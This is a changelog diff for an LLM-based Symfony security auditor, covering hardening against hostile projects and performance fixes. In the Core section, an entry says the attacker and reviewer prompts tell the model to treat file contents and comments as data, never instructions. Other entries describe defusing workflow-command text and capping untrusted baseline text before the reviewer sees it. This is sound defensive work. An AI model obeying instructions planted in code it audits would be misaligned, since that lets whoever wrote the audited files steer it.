+- A voter holding thousands of string literals, or fetching a constant array thousands of times, no longer slows the mapping, floods every prompt or exhausts a 128 MB process; each voter list is capped and ends with `… and N more` ([#468](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/468), [#523](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/523))
+- A controller whose actions call each other, or stack many `#[IsGranted]` and `#[Route]` attributes, no longer multiplies its form bindings and guards into prompts of megabytes or an exhausted 128 MB process; the lists are capped ([#522](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/522), [#524](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/524))
+- A `security.yaml` listing thousands of roles or firewalls no longer floods every attacker request: a route's `COVERED_BY` label lists at most 20 requirements and the firewall block at most 50 firewalls, each ending with `… and N more` ([#588](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/588))
+- A `--baseline` or `scan.import_sarif` file over 32 MiB, such as a symlink to `/dev/zero`, stops the run with a clear error and exit `1` instead of exhausting memory ([#602](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/602))
+- The MCP `audit` tool keeps the partial report, after the muted types and the baseline, of a run a budget cap or a provider failure stopped, as `audit:run` does ([#508](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/508))
+- `audit --help` lists `github-comment` among the formats and no longer shows a `--format` default that `audit.format` replaces, and the standalone binary's help names the configuration files it reads ([#498](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/498), [#567](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/567))
+- A failed `composer audit` is remembered for five minutes instead of being re-run by every `lookup_advisory` call, and a long-lived `mcp:serve` sees advisories disclosed after its first lookup: the in-memory snapshot expires after 24 hours ([#446](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/446), [#487](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/487))
+- The advisory lookup no longer reads a hostile `composer.lock` whole, caches a `composer audit` output it cannot use or keeps a failed answer: a lockfile over 8 MiB or a symlink gets no hash and runs uncached ([#416](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/416))
+- A pricing catalog refreshed by an older `self-update` no longer hides the newer one packaged in an upgraded binary ([#512](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/512))
+- `--output=/dev/null` keeps discarding the report without replacing the device, and `--output` and `--generate-baseline` refuse a pipe, a socket or a block device ([#539](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/539))
+
+### Performance Improvements 🚀
+
+- With `audit.static_prescan.lean_mode` on, an attacker pass no longer spends time growing with the square of the file count to set aside the files the pre-scan did not flag: on 40,000 files that step drops from 5.1 s to 0.01 s per pass ([#641](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/641))
+- Code slicing (`audit.code_slicing.enabled`, on under the `fast` profile) reads a line of plain ASCII about four times faster, with the same slices: on a code base of 5,000 PHP files, slicing drops from 42.6 s to 13.5 s per attacker pass ([#641](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/641))
+- Tens of thousands of `access_control` rules no longer cost most of a second per route: each rule is matched against all the routes an earlier rule leaves open at once, and the rules are read in time proportional to their number, so a dry run of 100 routes against 58,000 rules takes 20 seconds instead of 91, with the same coverage markers ([#641](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/641), [#642](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/642))
+- An attacker pass no longer spends time growing with the square of the file count to tell how each chunk ended: on 20,000 files that bookkeeping drops from 3.2 s to under 0.01 s per pass ([#641](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/641))
+- Grouping a large project's files into feature chunks takes seconds instead of minutes (1,000 controllers and 10,000 files: 14.8 s to 0.08 s), with the same chunks ([#458](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/458))
+- A controller whose public actions call each other in a long chain no longer stalls the mapping stage (6,000 methods map in under half a second) ([#469](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/469))
+- One very long line no longer holds the pre-scan or the code slicer for minutes on a PHP build without PCRE JIT: the gap in several pre-scan patterns is bounded to 512 characters ([#517](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/517))
+- An answer made of thousands of unclosed brackets no longer stalls the audit for minutes ([#457](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/457))
+- `audit:trend` reads each report once instead of twice ([#504](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/504))
+- Concurrent attacker analysis (`audit.attacker_max_concurrent` above 1) builds prompts per window, so memory no longer grows with the number of chunks (400 chunks: 83 MB to 11 MB) ([#470](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/470))
+- A run with many findings no longer adds every finding's location to every chunk of the next iteration: each list names the first 100 findings and counts the rest ([#460](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/460))
+- A batched review (`audit.reviewer_batch_size`) carries each file once instead of once per finding ([#459](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/459))
+- A repository's `access_control` paths can no longer stall the audit by backtracking: each pattern gets 10,000 steps and the route map is rendered once, taking a hostile project from 49 seconds to 2; a route whose rule cannot be decided is tagged `UNKNOWN_ACCESS_CONTROL` ([#577](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/577))
+- `audit:baseline` merges a report written by this release in time proportional to the report and the baseline, not to their product: 3,000 findings against 3,000 entries take a fraction of a second instead of a minute and a half ([#628](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/628))
+
+### Core 🧱
+
+- `mcp:serve` runs on `mcp/sdk` `^0.9`, for the bundle and the standalone binary; in bundle mode an application holding `mcp/sdk` at 0.8 must let it move to 0.9 ([#645](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/645))
+- `mcp:serve`, the `audit` MCP tool and its input schema are marked experimental: they may change in any release and are no longer covered by the backward compatibility promise ([#633](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/633))
+- Cached attacker and reviewer answers refresh once after upgrading ([#442](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/442), [#449](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/449), [#467](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/467), [#517](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/517), [#615](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/615))
+- A custom `RecordVulnerabilityToolFactoryInterface` tool may implement `RecordingToolInterface`, answering `RecordingToolInterface::RECORDED` for a call it took in and anything else for a refusal; one that does not still records on the last tool round ([#410](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/410), [#474](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/474), [#638](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/638))
+- Custom security-config parsers can implement `LoadOrderAwareSecurityConfigParserInterface` (since 1.22) to order configuration files as Symfony loads them ([#511](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/511))
+- Custom scanners can implement `SkippedFileReportingProjectFileScannerInterface` to report the files they leave out ([#473](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/473))
+- `AuditReport::foundNoFile()` and `AuditReport::isWithoutVerdict()` are new; `AuditReport::hasNoVerdict()` keeps its 1.21.0 meaning ([#437](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/437), [#543](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/543))
+- The attacker and reviewer prompts tell the model that file contents, comments and scanner text are data to analyse, never instructions ([#449](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/449))
+- Reports neutralise hostile finding text: the HTML report strips terminal escape sequences, the Markdown and GitHub comment reports no longer turn a bare URL, a `www.` address or an email address into a live link, nor an `@handle` into a mention, even one spelled `&commat;`, and `audit:baseline --annotate` shows a title and file as text ([#434](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/434), [#642](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/642))
+- A PHP file made of thousands of unmatched closing brackets that PHP's own parser rejects is no longer tokenized: the scrubber reads it as text, the parsers skip it with a warning and the attacker prompt marks its controller or voter `unmapped_access_control`; one that parses is read as before ([#520](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/520), [#603](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/603))
+- A file whose brackets nest more than 5,000 levels deep is skipped by the access-control, voter and form parsers with a warning instead of exhausting memory or crashing the audit, and the attacker prompt marks its controller or voter `unmapped_access_control` ([#445](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/445), [#603](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/603))
+- Provider API keys sent in a request URL (`?key=` on Vertex AI) are replaced with `***REDACTED***` in provider failure messages, logs, the console error line and MCP answers ([#536](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/536))
+- `composer audit` runs on a private copy of `composer.lock` next to an empty `composer.json`, so the audited project cannot redirect advisories; its `config.audit.ignore`, private repositories and `auth.json` no longer apply, so configure them in the Composer home of the user running the auditor ([#419](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/419), [#547](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/547))
+- Attacker, reviewer, triage-memory and advisory cache files are created `0600` and new cache directories `0700`; run `chmod -R go-rwx` on a `cache.dir` an earlier release created ([#418](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/418))
+- `privacy.offline_only` no longer mistakes an `api_key` such as `user:s3cretpassword` for a platform endpoint, and a refusal names only `scheme://host[:port]`, never userinfo or a query ([#505](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/505))
+- The MCP `audit` tool still runs a cost-budgeted audit on a model it cannot price, and logs a warning that `audit.budget.max_cost_usd` cannot be enforced ([#546](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/546))
+- A pricing catalog with a negative, infinite or input-less price is treated as an unpriced model, a refreshed catalog the run cannot use falls back to the packaged one, and `doctor` names the catalog in use ([#430](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/430))
+- `self-update` pins every request to HTTPS with TLS 1.2 or newer and bounds what it downloads (1 MiB for release metadata, 256 MiB for the binary) ([#432](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/432))
+- `self-update` resolves a bare binary name through `PATH` only, so it can no longer replace a same-named executable in the current folder ([#417](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/417))
+- `self-update` refuses a release tag that is not a release version (`X.Y.Z`, optional pre-release, optional leading `v`) instead of pasting it into download URLs ([#433](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/433))
+- The GitHub Action's `comment-pr` step posts only the report its audit wrote, never a file a symbolic link in the pull request points at, and says why in a warning when it posts nothing ([#576](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/576))
+- `--since` no longer runs a command that an audited checkout's own `.git` directory defines ([#624](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/624))
+
+## [1.21.0] — 2026-10-04 — Gateway
+
+### New Features ✨
+
+- `audit:run --fail-on-incomplete` exits with the new code `3` when some file could not be fully analyzed, `--generate-baseline` included; without it the run prints an `Audit incomplete: N file(s) could not be fully analyzed` warning, on stderr when the report goes to stdout; the GitHub Action gains a `fail-on-incomplete` input and a `complete` output ([#389](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/389))
+- Bill each call at the rate of the model the provider says answered it, so a gateway that routes on its own (`openrouter/auto`), a failover platform or an alias resolved to a dated release is no longer billed at the configured model's rate; `by_model` keeps the configured model and the new additive `billed_models` key names the billed ones ([#385](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/385))
+- `init --provider=generic.<instance>` configures any OpenAI-compatible AI gateway behind a custom URL and token; `provider: <platform>.<instance>` selects an instance of `generic`, `openresponses`, `azure`, `bedrock`, `cache` and `failover`, and a bare or mistyped instance is refused with exit `2` naming the instances configured ([#367](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/367))
+- `init --base-url` and a base-URL prompt for `albert`, `amazeeai`, `generic` and `openresponses`; an empty URL is refused with exit `2`, a URL whose every `%` starts a percent-encoded octet is written so the platform receives it as typed, and any other `%` is refused ([#367](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/367), [#371](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/371))
+- `init --endpoint` writes the connection URL of `deepgram`, `elevenlabs`, `minimax`, `ollama`, `together` and `venice`, and `--no-api-key` writes no `api_key` for `bedrock`, `deepgram`, `elevenlabs`, `generic`, `ollama` and `openresponses`; `init --provider=ollama` now writes a keyless configuration with a required endpoint instead of one the next run cannot boot ([#371](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/371))
+- `init` configures AWS Bedrock through its Mantle routes (`anthropic.*` models use `messages`, `google.gemma-*` use `responses`, others use `completions`), reads the key from `BEDROCK_API_KEY` and installs the bridges the route needs; `--no-api-key` signs requests with AWS SigV4, and a model that does not name its vendor is refused with exit `2` ([#386](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/386))
+- `init` installs the bridge of the platforms it cannot configure (`azure`, `cartesia`, `higgsfield`, `dockermodelrunner`, `lmstudio`, `transformersphp`), prints a ready-to-edit `config.yaml` block and exits `2` without writing; `cache` and `failover` are refused with the reason, and `doctor` points at `init --provider=<platform>` for a missing bridge ([#382](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/382))
+- Support the Fireworks, Together, Venice, Eden AI, TypeSafe and Higgsfield platforms of `symfony/ai` 0.14 ([#380](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/380))
+- The standalone binary stores your provider API key: `init` asks for it with hidden input, `auth:set` stores or replaces it, `auth:status` reports which key an audit would use and where it comes from, and `auth:remove` forgets it; an exported variable still wins over the stored key ([#361](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/361))
+- The stored key lives in an owner-only `credentials.json` beside the config file and an exposed file is refused rather than used; the audit header, `auth:status` and `doctor` show the key as a masked preview, plus a fingerprint in the last two, never in full ([#361](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/361))
+- `%env(file:VAR)%` reads the provider credential from the file `VAR` names in the standalone configuration, for Docker and Kubernetes secrets, `systemd` `LoadCredential=` or a plain `0600` file ([#361](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/361))
+- A run with no API key opens with `No API key available.` and names `auth:set --env-var=<VAR>`, an `export` or a password-manager prefix as ways out, `doctor` names the key that resolved, and `init` no longer prints a paste-ready `export` line that would land the key in the shell history ([#361](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/361))
+- `init` says it is downloading the bridge and lists the provider, model and API-key variable it resolved, refuses a `--provider` or `--model` holding control characters, and `init --help` documents its defaults ([#367](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/367), [#391](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/391))
+- `symfony-security-auditor mcp:serve` serves the auditor over the Model Context Protocol from the standalone binary, as `bin/console mcp:serve` does in bundle mode ([#384](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/384))
+- The audit header names a project `.symfony-security-auditor.yaml` layered over the user config ([#391](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/391))
+- A project `.symfony-security-auditor.yaml` may no longer set `cache`, `privacy`, `audit.custom_skills`, `scan.secret_scrubbing` or `scan.custom_risk_patterns`, loosen `audit.budget`, or replace a whole section with a non-map; the run stops naming the key, so move these settings to your user config, which keeps them ([#391](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/391), [#397](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/397))
+- A project config accepts `model`, `attacker_model`, `reviewer_model` and `audit.escalation.cheap_model` only as a plain model id (options such as `?temperature=…` belong in your user config), refuses values or keys holding control characters, `::` or `##[` naming the key without echoing it, and refuses a file expanding to 10,000 values or more ([#391](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/391), [#397](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/397))
+- A project config may no longer use `%env()%`, `%name%` or `%%` references, so it cannot read your environment (write the value itself or move the setting to your user config), and a project config that is a symlink is refused before it is read ([#391](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/391))
+- On a GitHub Actions runner, reports, errors, progress lines, the `--show-scanned` listing and `audit:diff` defuse text a runner would read as a workflow command (`::…`, `##[`); the `github` format and reports saved with `--output` are unchanged ([#389](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/389), [#391](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/391))
+- A route covered only by an `access_control` rule the production application never loads (under `when@test`, a non-production config folder, a file nothing imports) is `LACKS_ACCESS_CHECK` again, and the attacker prompt presents the coverage it shows as read from the repository's YAML, not verified ([#396](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/396))
+- The secret scrubber redacts credential keys written without a separator (`SECRETKEY=`, `APIKEY=`, `DBPASS=`, `PGPASSWORD=`) and the `PASS` and `PW` suffixes (`DB_PASS=`, `MYSQL_ROOT_PW=`, `pass: '…'`), leaving `MONKEY`, `MAX_PW_LENGTH` and `BYPASS_CACHE` alone ([#390](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/390))
+- The secret scrubber redacts PGP private keys, Symfony XML `<parameter>` and `env(…)` parameter defaults, `define()` constants, bare `token` keys, GitLab, Hugging Face, npm, SendGrid and PyPI tokens and Discord webhook URLs, but leaves code values such as `$token = $request->get('token')` as written ([#390](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/390))
+- A file the secret scrubber cannot evaluate is recorded as not analyzed, so the report is incomplete, `audit:run` prints its `Audit incomplete` warning and `--fail-on-incomplete` exits `3`; a long credential-named line no longer blanks the whole file ([#396](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/396))
+
+### Bugfixes 🐛
+
+- Installing the bundle with `composer require --dev` no longer breaks the host application's container: the bundle registers its own clock service, since `Psr\Clock\ClockInterface` exists only when `symfony/clock` is a non-dev package ([#403](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/403))
+- The reviewer sees the code of a finding the attacker reported as `./src/…` ([#388](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/388))
+- A chunk the model cannot fit is split in two and each half analyzed, instead of aborting the audit on `context_length_exceeded` or an HTTP `413`; a single file that still does not fit is recorded as errored, and when the prompt's fixed part leaves no room the run stops at once, naming the remedy ([#387](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/387), [#388](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/388))
+- A review batch or finding the model cannot fit no longer aborts the audit: the batch is split until every part fits, and a lone finding that still does not fit is recorded as errored ([#388](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/388))
+- An answer cut off by the output limit or withheld by a content filter, whether reported as a stop reason or an error, is recorded as errored and the audit goes on; it is never cached as "no findings" or counted as a rejected finding, and a garbled tool call is retried ([#387](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/387), [#388](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/388), [#399](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/399))
+- `audit.budget` is checked before each call is dispatched, and requests a concurrent window leaves in flight when it ends early are cancelled and booked, as are degraded answers, so the report and `estimated_cost_usd` no longer undercount ([#387](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/387))
+- A finding that quotes a Markdown code block keeps its backticks, and a baseline-accepted finding the attacker re-reports in a later iteration stays out of the report ([#387](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/387), [#388](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/388))
+- A call failing on a dropped connection (TLS EOF, `Empty reply from server`, `Broken pipe`, a partly transferred body), a refused connection, a DNS failure or a genuine rate limit whose body quotes a number like `404` is retried instead of aborting the audit ([#375](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/375), [#387](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/387))
+- A concurrent conversation whose retries run out aborts the audit, as the sequential one does, and `LLM call failed after N attempts` counts every attempt ([#399](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/399))
+- A finding whose review failed is no longer fed back to the attacker as rejected ([#398](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/398))
+- In `lean` mode the attacker's `read_file`, `grep` and `list_files` tools see the whole project again, and `grep` no longer fails when one file is not valid UTF-8 ([#388](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/388))
+- The escalation deep pass no longer treats the cheap model's findings as reviewer-validated: it receives them as unverified candidates to confirm, refine or discard, and a cheap finding on a file it judged is dropped ([#388](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/388))
+- Cost is priced at the rate of the platform serving the model for the 20 `symfony/ai` platforms with a catalog listing (Bedrock, Azure, Vertex AI, OVH, Scaleway, Hugging Face, …), no longer at another provider's rate or `$0.00` ([#383](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/383))
+- A report never calls a partial audit clean: the human formats print `Audit incomplete: N file(s) could not be fully analyzed` and qualify the risk level, JUnit adds an errored `Audit completeness` case, the JSON report gains `complete`, SARIF gains `invocations[0].executionSuccessful` and the Action badge turns `incomplete` ([#378](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/378), [#389](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/389))
+- A run that analyzed no file and found nothing has no verdict: it exits `1` with `RISK LEVEL: UNKNOWN`, `--generate-baseline` leaves the baseline untouched, the `audit` MCP tool answers with an error, and a `--dry-run` report says none of its files was analyzed ([#398](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/398))
+- Live progress shows `✗ chunk 2/5 failed` for a chunk the attacker could not analyze and `✗ review failed` for a review that reached no verdict, which the review tally counts as `failed`, not `rejected` ([#388](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/388), [#398](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/398))
+- `audit:diff`, `audit:trend` and `audit:baseline --prune` no longer treat a finding as fixed, or prune it, when the later run did not analyze its file: `audit:diff` lists it as `unverified`, trend points gain an `unverified` count, a prune keeps the entry and its reason, and the JSON report gains a `scope` key ([#389](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/389), [#398](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/398))
+- The `audit` MCP tool says why it failed and applies the configured baseline, `audit.excluded_types` and `audit.included_types`, as `audit:run` does ([#389](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/389), [#398](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/398))
+- An `--output` or `--generate-baseline` path that could never be saved to (a symlink, a directory, a path beneath a file) is refused before the audit runs, and a failed save prints the report and keeps the abort reason ([#398](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/398))
+- The secret scrubber no longer hides the code an audit has to read: `$password = $request->get('password');`, `'secret' => getenv('APP_SECRET')` and a `WHERE password = '" . $pw . "'` concatenation stay as written ([#390](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/390))
+- The same project is chunked the same way on every machine, because files are scanned in relative-path order ([#390](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/390))
+- A stale `$PWD` no longer points the standalone binary at another directory's `.symfony-security-auditor.yaml`, and a relative `SYMFONY_SECURITY_AUDITOR_HOME` is refused instead of silently ignored: set it to an absolute path or unset it ([#391](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/391))
+- A `%env(trim:…)%` or other env-processor placeholder in a standalone config stops the run saying the binary reads only `%env(VAR)%` and `%env(file:VAR)%`, and an API key or URL holding `%` reaches the provider exactly as stored; `init` refuses such a placeholder as a base URL or endpoint and a `%…%` pair in `--model` ([#377](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/377), [#391](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/391))
+- With several platforms configured, a key the selected `provider:` does not use no longer stops the run, and `audit --show-scanned` no longer needs a provider credential in the standalone binary ([#397](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/397))
+- The standalone binary waits up to ten minutes for a provider to start answering instead of 60 seconds, and the new standalone-only `http_timeout` key sets the seconds; a project config may raise it, never lower it ([#397](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/397))
+- `init` holds the bridge tree to the `symfony/ai-platform` release the binary bundles, and a tree built by 1.20.x is refused with the `init --force` command that rebuilds it; when upgrading from 1.20.x run `symfony-security-auditor init --provider=<your provider> --force` once ([#391](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/391), [#397](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/397))
+- A bridge the binary cannot load, or a platform whose bridge is not installed, now names `symfony-security-auditor init --provider=<provider>` instead of killing every command or suggesting `composer require`; `init` also refreshes the pins of a bridge manifest written before 1.15 ([#391](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/391), [#397](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/397))
+- `init` writes every value so it reads back as the string it was, asks to overwrite a configuration only after every refusal, refuses any platform `symfony/ai-bundle` does not declare (Meta/Llama is no longer listed; use `generic`) and requests the right package for five misnamed bridges ([#367](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/367), [#391](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/391))
+- `--help`, `help`, `list --format=json|xml|md` and shell completion work for the standalone `audit` and `mcp:serve` commands before `init` has run ([#384](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/384), [#391](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/391))
+- The standalone binary boots against Ollama ([#366](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/366))
+- `self-update` refuses a binary whose directory it cannot write to before downloading anything, prints `Downloaded and verified <new>` instead of claiming `Updated` before the swap, and a swap that fails exits `1` with a readable error and the previous version still installed ([#392](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/392))
+- `install.sh` replaces an existing binary atomically and cleans up its staged copy when interrupted, and `install.ps1` downloads at full speed on Windows PowerShell 5.1 ([#392](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/392))
+- The standalone update check no longer contacts GitHub on every command when its cache directory cannot be written, and `mcp:serve` sends PHP notices and warnings to stderr so they cannot corrupt the JSON-RPC stream ([#392](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/392))
+
+### Performance Improvements 🚀
+
+- A model's price is resolved once per run, and a concurrent tool-using window ends as soon as every conversation has its answer ([#387](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/387))
+- Long attacker runs spend less time between LLM calls, and `audit:diff` of two large reports no longer grows quadratically ([#388](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/388), [#389](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/389))
+- Scrubbing half a megabyte of `-----BEGIN PRIVATE KEY-----` headers no longer takes 11 seconds ([#396](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/396))
+
+### Core 🧱
+
+- Runs on `symfony/ai` 0.14 (`symfony/ai-bundle` `^0.14`): in bundle mode raise every `symfony/ai-*-platform` bridge your application requires to `^0.14` in the same update, and in the standalone binary rebuild the bridge tree once with `init --force` ([#380](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/380))
+- `mcp:serve` runs on `mcp/sdk` `^0.8.1`, for the bundle and the standalone binary; in bundle mode an application holding `mcp/sdk` at 0.7 must let it move to 0.8 ([#358](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/358))
+- `symfony/http-client` and `symfony/clock` are now direct dependencies and `symfony/models-dev` requires `>=130.0` ([#366](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/366), [#383](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/383), [#403](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/403))
+- The package no longer requires the `uri` extension, which only PHP 8.5 ships; `league/uri-polyfill` supplies it below ([#404](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/404))
+- Cached attacker answers refresh once after upgrading, and reviewer verdicts cached with false-positive feedback are reviewed once again ([#388](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/388), [#390](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/390), [#398](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/398))
+- Baseline entries reach the reviewer capped (`type` 64, `file` 512, `title` 300, `reason` 5,000 characters), quoted as data and within a bounded section, and attacker prompt preambles fold every Unicode line break in a file path or risk-marker description ([#388](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/388), [#398](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/398))
+- The JSON path of the attacker and reviewer takes the last top-level block of an answer that decodes to an object or a list holding one, so quoted examples and brackets in prose such as `[1]` no longer stand for the answer ([#399](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/399))
+- A value pasted into `--env-var` is masked or escaped instead of printed, and a relative `$HOME` is treated as unset so the config, credentials and cache directories never resolve inside the audited project ([#391](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/391))
+- `lookup_advisory` also reads Composer's ignored advisories, so the audited project's `config.audit.ignore` does not hide a vulnerable dependency ([#390](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/390))
+- A symlinked directory above a report, baseline or cache file is refused, and a symlink committed in the audited repository can no longer lead the scanner outside the project ([#390](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/390))
+- The standalone quickstart reads the API key from stdin instead of `export ANTHROPIC_API_KEY=sk-…`, so the key never lands in your shell history ([#354](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/354))
+
 ## [1.20.1] — 2026-08-23 — Herald
 
-A release about the binary saying who it is and what it just did. The identity
-banner now prints for every command rather than only `audit` — `--version`,
-`-h`, `doctor`, `init` and `self-update --check` all used to open anonymously —
-and exactly one collaborator prints it per run, so it never doubles up. It
-carries the project homepage, and a rendered error now ends with the command
-line that produced it, which is the piece a pasted CI log was always missing.
-`--dry-run` no longer demands a provider credential it never uses, so a project
-can be priced before anyone signs up for an API key.
+### New Features ✨
 
-### Fixed
+- The standalone binary prints its identity banner on every command (`--version`, `-h`, `doctor`, `init`, `self-update --check`, …) instead of only `audit`, once per run and on stderr so `--version` and `list --format=json` keep a clean stdout; the completion commands stay bare ([#348](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/348))
+- The identity banner carries the project homepage under the wordmark ([#348](https://github.com/vinceAmstoutz/symfony-security-auditor/pull/348))
